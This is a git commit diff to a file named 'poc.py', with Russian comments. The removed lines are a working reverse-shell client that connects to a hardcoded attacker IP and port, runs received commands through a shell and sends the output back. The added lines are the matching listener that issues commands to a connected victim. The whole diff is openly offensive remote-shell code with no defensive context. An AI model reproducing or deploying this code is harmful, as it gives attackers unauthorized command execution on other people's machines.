99aca8750214de02bde22e531754e66ecd645b75
marcusovkost <nemarcusov@gmail.com>
2025-01-25 18:45:45 +0300

    Update poc.py

--- poc.py
+++ poc.py
@@ -1,29 +1,22 @@
 import socket
-import subprocess
 
-server_ip = '95.165.8.178'  # Ваш IP-адрес (это будет IP вашего атакующего сервера)
-server_port = 7777         # Порт, на котором будет слушать ваш сервер
 
-# Создаем сокет для подключения к вашему серверу
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((server_ip, server_port))
+s.bind(('95.165.8.178', 7777))
+s.listen(5)
+
+
+client, addr = s.accept()
+
 
 while True:
-    try:
-        command = s.recv(1024).decode('utf-8')  # Получаем команду от атакующего сервера
-        if command.lower() == 'exit':
-            break
-        if command:
-            # Обрабатываем команду и получаем вывод
-            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    command = input('Enter command: ')
+    client.send(command.encode())
+    if command.lower() == 'exit':
+        break
+    result_output = client.recv(4096).decode()
+    print(result_output)
 
-            # Возвращаем вывод или ошибку
-            output = result.stdout + result.stderr
-            if not output:
-                output = b'No output or error message.'
 
-            s.send(output)  # Отправляем результат выполнения команды обратно
-    except Exception as e:
-        s.send(f"Error: {str(e)}".encode())  # Отправляем сообщение об ошибке, если она произошла
-
+client.close()
 s.close()
